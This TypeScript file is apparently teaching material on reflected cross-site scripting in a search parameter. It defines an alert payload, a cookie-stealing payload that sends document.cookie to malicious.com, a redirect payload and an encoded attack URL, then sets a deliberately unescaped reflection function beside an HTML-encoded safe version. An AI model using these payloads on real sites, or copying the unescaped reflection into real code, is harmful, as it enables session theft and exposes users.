/**
 * @file xss-payload.ts
 * @description Example TypeScript code demonstrating a reflected XSS payload.
 *              This is for educational purposes only to show how XSS can occur.
 *              DO NOT use this on systems without explicit authorization.
 */

// --- Scenario: Reflected XSS in a search parameter ---
// Imagine a web application has a search functionality where the search query
// is directly reflected back into the HTML without proper encoding.
// e.g., `http://example.com/search?query=YOUR_INPUT_HERE`

// --- Vulnerable HTML (Conceptual) ---
/*
<input type="text" value="<%= request.query.query %>">
<div>You searched for: <%= request.query.query %></div>
*/

// --- XSS Payload Example ---
// This payload attempts to execute an alert box in the user's browser.
// When injected into a vulnerable parameter, it would close the existing HTML tag
// and inject a new script tag.

const xssPayload_alert: string = `"><script>alert('XSS Vulnerability Detected!');</script>`;

// Another common payload to steal cookies (conceptual)
const xssPayload_cookieStealer: string = `"><script>document.location='http://malicious.com/log?c='+document.cookie;</script>`;

// Payload to redirect the user (conceptual)
const xssPayload_redirect: string = `"><script>window.location.href='http://malicious.com';</script>`;

// --- How to use (Conceptual) ---
// If the vulnerable URL is `http://example.com/search?q=`, you would try to navigate to:
// `http://example.com/search?q=` + encodeURIComponent(xssPayload_alert)
// or directly:
// `http://example.com/search?q=%22%3E%3Cscript%3Ealert(%27XSS%20Vulnerability%20Detected!%27);%3C/script%3E`

console.log("XSS Payload (alert):");
console.log(xssPayload_alert);

console.log("\nXSS Payload (cookie stealer):");
console.log(xssPayload_cookieStealer);

console.log("\nXSS Payload (redirect):");
console.log(xssPayload_redirect);

// In a real scenario, you would typically encode these payloads for URL parameters
// or other contexts where they are injected.

function encodeHTML(str: string): string {
    const div = document.createElement('div');
    div.appendChild(document.createTextNode(str));
    return div.innerHTML;
}

// Example of how a vulnerable application might reflect input (BAD)
function vulnerableSearchDisplay(query: string): string {
    // This is a highly simplified and INSECURE example.
    // DO NOT use this in production.
    return `<div>You searched for: ${query}</div>`;
}

// Example of how to safely display input (GOOD)
function safeSearchDisplay(query: string): string {
    return `<div>You searched for: ${encodeHTML(query)}</div>`;
}

// Simulate a vulnerable reflection
// console.log(vulnerableSearchDisplay(xssPayload_alert));

// Simulate a safe reflection
// console.log(safeSearchDisplay(xssPayload_alert));
